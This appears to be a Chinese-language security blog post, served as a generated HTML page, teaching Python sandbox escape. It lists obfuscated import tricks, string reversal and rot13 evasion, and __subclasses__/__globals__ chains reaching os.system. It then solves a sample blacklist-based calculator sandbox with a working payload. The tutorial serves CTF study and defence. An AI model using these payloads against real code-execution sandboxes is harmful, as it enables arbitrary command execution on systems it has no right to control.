@@ -1,0 +1,524 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || Python沙箱逃逸</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Python沙箱逃逸 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/2/12
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Python" style=color:#879cff>
+                    Python
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<h3 id="Python中执行系统命令的方式"><a href="#Python中执行系统命令的方式" class="headerlink" title="Python中执行系统命令的方式"></a>Python中执行系统命令的方式</h3><ul>
+<li><p>使用<code>os</code>包中的<code>popen</code>，<code>system</code>两个函数来直接执行<code>shell</code></p>
+</li>
+<li><p>使用<code>commands</code>模块中的方法</p>
+</li>
+<li><p>使用<code>subprocess</code></p>
+</li>
+<li><p>使用写文件到指定位置，再使用其他辅助手段</p>
+</li>
+<li><p>如：</p>
+<pre><code class="python">import os
+import subprocess
+import commands
+
+os.system(&#39;whoami&#39;)
+os.popen(&#39;whoami&#39;)
+commands.getoutput(&#39;whoami&#39;) # py2
+commands.getstatusoutput(&#39;whoami&#39;) # py2
+subprocess.call([&#39;whoami&#39;],shell=True)
+</code></pre>
+</li>
+</ul>
+<h3 id="花式-import"><a href="#花式-import" class="headerlink" title="花式 import"></a>花式 import</h3><ul>
+<li><p>对于防御者来说，最基础的思路，就是对代码的内容进行检查，最常见的方法就是禁止引入敏感的包</p>
+</li>
+<li><p>利用<code>__import__</code>函数</p>
+<pre><code class="python">f = __import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))
+print(f.getoutput(&#39;ifconfig&#39;))
+</code></pre>
+</li>
+<li><p>使用<code>importlib</code>库</p>
+<pre><code class="python">import importlib
+f = importlib.import_module(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))
+print(f.getoutput(&#39;ifconfig&#39;))
+</code></pre>
+</li>
+<li><p><code>__builtin__</code>模块：可以通过<code>reload(__builtin__)</code>得到完整的模块，reload被删除时：</p>
+<pre><code class="python">import imp
+imp.reload(__builtin__)
+</code></pre>
+</li>
+<li><p>os从<code>sys.modules</code>中删掉：（所有的类unix系统中，Python的os模块的路径几乎都是<code>/usr/lib/python2.7/os.py</code>中）</p>
+<pre><code class="python">import sys
+sys.modules[&#39;os&#39;]=&#39;/usr/lib/python2.7/os.py&#39;
+import os
+</code></pre>
+</li>
+<li><p>引入模块的过程，就是把对应模块的代码执行一遍的过程，禁止引入时，知道对应的路径，就可以执行相应的代码：</p>
+<pre><code class="python">execfile(&#39;/usr/lib/python2.7/os.py&#39;)
+system(&#39;ls&#39;)
+# 3.x 删了 execfile，不过可以这样：
+with open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;) as f:
+    exec(f.read())
+system(&#39;ls&#39;)
+</code></pre>
+</li>
+</ul>
+<h3 id="处理字符串"><a href="#处理字符串" class="headerlink" title="处理字符串"></a>处理字符串</h3><ul>
+<li><p>拼接：</p>
+<pre><code class="python">b = &#39;o&#39;
+a = &#39;s&#39;
+__import__(a+b).system(&#39;ls&#39;)
+</code></pre>
+</li>
+<li><p>逆序：</p>
+<pre><code class="python">eval(&#39;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#39;[::-1])
+exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1])
+__import__(&#39;so&#39;[::-1]).system(&#39;dir&#39;)
+</code></pre>
+</li>
+<li><p>通过 <code>getattr</code> 拿到对象的方法、属性：</p>
+<pre><code class="python">import os
+getattr(os, &#39;metsys&#39;[::-1])(&#39;whoami&#39;)
+# 或
+getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;whoami&#39;)
+</code></pre>
+</li>
+</ul>
+<h3 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h3><ul>
+<li><p>Python中新式类都有个属性，叫<code>__mro__</code>，是个元组，记录了继承关系</p>
+<pre><code class="python">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
+(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)
+</code></pre>
+</li>
+<li><p>由于没法直接引入<code>os</code>，假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）</p>
+</li>
+<li><p>如：<code>site</code> 库就有 <code>os</code>：</p>
+<pre><code class="python">&gt;&gt;&gt; import site
+&gt;&gt;&gt; site.os
+&lt;module &#39;os&#39; from &#39;E:\Python2\lib\os.pyc&#39;&gt;
+</code></pre>
+</li>
+<li><p>可以利用<code>reload</code>加载<code>os</code>：</p>
+<pre><code class="python">import site
+os = reload(site.os)
+os.system(&#39;whoami&#39;)
+</code></pre>
+</li>
+<li><p>用<code>__subclasses__</code>看子类：</p>
+<pre><code class="python">for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()):
+     print(i)
+# 利用site._Printer引入os
+&#39;&#39;.__class__.__mro__[-1].__subclasses__()[73]._Printer__setup.__globals__[&#39;os&#39;]
+</code></pre>
+</li>
+<li><p>这个方法不仅限于 A-&gt;os，还可以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p>
+<pre><code class="python">import warnings
+warnings.linecache
+warnings.linecache.os
+</code></pre>
+</li>
+<li><p>在继承链中：</p>
+<pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;whoami&#39;)
+</code></pre>
+</li>
+<li><p>通过<code>warnings.catch_warnings</code>，的<code>_module</code>属性构造payload：</p>
+<pre><code class="python">[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &#39;catch_warnings&#39;][0]()._module.linecache.os.system(&#39;whoami&#39;)
+</code></pre>
+</li>
+<li><p>利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p>
+<pre><code class="python">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)
+[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)
+class test(dict):
+    def __init__(self):
+        print(super(test, self).keys.__class__.__call__(eval, &#39;1+1&#39;))
+        # 如果是 3.x 的话可以简写为：
+        # super().keys.__class__.__call__(eval, &#39;1+1&#39;))
+test()
+</code></pre>
+</li>
+<li><p>总结：通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等能够直接被利用的库，或找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code></p>
+</li>
+</ul>
+<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><ul>
+<li><p>2.x 有个内建的 <code>file</code>函数，还有个 <code>open</code>，2.x 与 3.x 通用：</p>
+<pre><code class="python">file(&#39;key&#39;, &#39;w&#39;).write(&#39;123456&#39;)
+file(&#39;key&#39;).read()
+</code></pre>
+</li>
+<li><p>还有一些库，例如：<code>types.FileType</code>—<code>(rw)</code>、<code>platform.popen</code>—<code>(rw)</code>、<code>linecache.getlines</code>—<code>(r)</code></p>
+</li>
+<li><p>如果可写文件，可以将文件保存为<code>xxx.py</code>，然后 import 进来执行命令：</p>
+<pre><code class="python"># xxx.py
+import os
+print(os.system(&#39;whoami&#39;))
+# 1.py
+import xxx
+</code></pre>
+</li>
+<li><p>py 文件命名是有技巧的，要挑一个常用的标准库，因为过滤库名可能采用的是白名单，有些库是在<code>sys.modules</code>中有的，这些库无法利用，会直接从<code>sys.modules</code>中加入</p>
+</li>
+</ul>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul>
+<li><p>过滤<code>[]</code>：将<code>[]</code>的功能用<code>pop</code> 、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code> ）</p>
+</li>
+<li><p>新特性：PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<code>f&#39;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#39;</code></p>
+</li>
+<li><p><code>dir()</code> 与 <code>__dict__</code>：列出一个模组/类/对象 下面 所有的属性和函数</p>
+</li>
+<li><p><code>getattr</code>：函数接受两个参数，一个模组或者对象，第二个是一个字符串，该函数会在模组或者对象下面的域内搜索有没有对应的函数或者属性</p>
+<pre><code class="python">import codecs
+import os
+
+getattr(os, codecs.encode(&quot;flfgrz&quot;, &#39;rot13&#39;))(&#39;whoami&#39;)
+</code></pre>
+</li>
+</ul>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><pre><code class="python">def banner():
+    print &quot;=============================================&quot;
+    print &quot;   Simple calculator implemented by python   &quot;
+    print &quot;=============================================&quot;
+    return
+
+
+def getexp():
+    return raw_input(&quot;&gt;&gt;&gt; &quot;)
+
+
+def _hook_import_(name, *args, **kwargs):
+    module_blacklist = [&#39;os&#39;, &#39;sys&#39;, &#39;time&#39;, &#39;bdb&#39;, &#39;bsddb&#39;, &#39;cgi&#39;,
+                        &#39;CGIHTTPServer&#39;, &#39;cgitb&#39;, &#39;compileall&#39;, &#39;ctypes&#39;, &#39;dircache&#39;,
+                        &#39;doctest&#39;, &#39;dumbdbm&#39;, &#39;filecmp&#39;, &#39;fileinput&#39;, &#39;ftplib&#39;, &#39;gzip&#39;,
+                        &#39;getopt&#39;, &#39;getpass&#39;, &#39;gettext&#39;, &#39;httplib&#39;, &#39;importlib&#39;, &#39;imputil&#39;,
+                        &#39;linecache&#39;, &#39;macpath&#39;, &#39;mailbox&#39;, &#39;mailcap&#39;, &#39;mhlib&#39;, &#39;mimetools&#39;,
+                        &#39;mimetypes&#39;, &#39;modulefinder&#39;, &#39;multiprocessing&#39;, &#39;netrc&#39;, &#39;new&#39;,
+                        &#39;optparse&#39;, &#39;pdb&#39;, &#39;pipes&#39;, &#39;pkgutil&#39;, &#39;platform&#39;, &#39;popen2&#39;, &#39;poplib&#39;,
+                        &#39;posix&#39;, &#39;posixfile&#39;, &#39;profile&#39;, &#39;pstats&#39;, &#39;pty&#39;, &#39;py_compile&#39;,
+                        &#39;pyclbr&#39;, &#39;pydoc&#39;, &#39;rexec&#39;, &#39;runpy&#39;, &#39;shlex&#39;, &#39;shutil&#39;, &#39;SimpleHTTPServer&#39;,
+                        &#39;SimpleXMLRPCServer&#39;, &#39;site&#39;, &#39;smtpd&#39;, &#39;socket&#39;, &#39;SocketServer&#39;,
+                        &#39;subprocess&#39;, &#39;sysconfig&#39;, &#39;tabnanny&#39;, &#39;tarfile&#39;, &#39;telnetlib&#39;,
+                        &#39;tempfile&#39;, &#39;Tix&#39;, &#39;trace&#39;, &#39;turtle&#39;, &#39;urllib&#39;, &#39;urllib2&#39;,
+                        &#39;user&#39;, &#39;uu&#39;, &#39;webbrowser&#39;, &#39;whichdb&#39;, &#39;zipfile&#39;, &#39;zipimport&#39;]
+    for forbid in module_blacklist:
+        if name == forbid:  # don&#39;t let user import these modules
+            raise RuntimeError(&#39;No you can\&#39; import &#123;0&#125;!!!&#39;.format(forbid))
+    # normal modules can be imported
+    return __import__(name, *args, **kwargs)
+
+
+def sandbox_filter(command):
+    blacklist = [&#39;exec&#39;, &#39;sh&#39;, &#39;__getitem__&#39;, &#39;__setitem__&#39;,
+                 &#39;=&#39;, &#39;open&#39;, &#39;read&#39;, &#39;sys&#39;, &#39;;&#39;, &#39;os&#39;]
+    for forbid in blacklist:
+        if forbid in command:
+            return 0
+    return 1
+
+
+def sandbox_exec(command):  # sandbox user input
+    result = 0
+    __sandboxed_builtins__ = dict(__builtins__.__dict__)
+    __sandboxed_builtins__[&#39;__import__&#39;] = _hook_import_  # hook import
+    del __sandboxed_builtins__[&#39;open&#39;]
+    _global = &#123;
+        &#39;__builtins__&#39;: __sandboxed_builtins__
+    &#125;
+    if sandbox_filter(command) == 0:
+        print &#39;Malicious user input detected!!!&#39;
+        exit(0)
+    command = &#39;result = &#39; + command
+    try:
+        exec command in _global  # do calculate in a sandboxed environment
+    except Exception, e:
+        print e
+        return 0
+    result = _global[&#39;result&#39;]  # extract the result
+    return result
+
+
+banner()
+while 1:
+    command = getexp()
+    print sandbox_exec(command)
+</code></pre>
+<ul>
+<li><p><code>exec command in _global</code>：由于<code>exec</code>运行在自定义的全局命名空间里，会处于受限执行模式，<code>exec</code>加上定制的<code>globals</code>会使得沙箱安全很多，一些常规的payload是没法使用的</p>
+</li>
+<li><p>但由于<code>exec</code>运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如<code>types</code>库，来执行任意命令：</p>
+<pre><code class="python">getattr(__import__(&#39;types&#39;).__builtins__[&#39;__tropmi__&#39;[::-1]](&#39;so&#39;[::-1]), &#39;mets&#39; &#39;ys&#39;[::-1])(&#39;whoami&#39;)
+</code></pre>
+</li>
+</ul>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/203208.html">一文看懂Python沙箱逃逸 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/52">Python沙箱逃逸的n种姿势 - 先知社区 (aliyun.com)</a></p>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2023 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
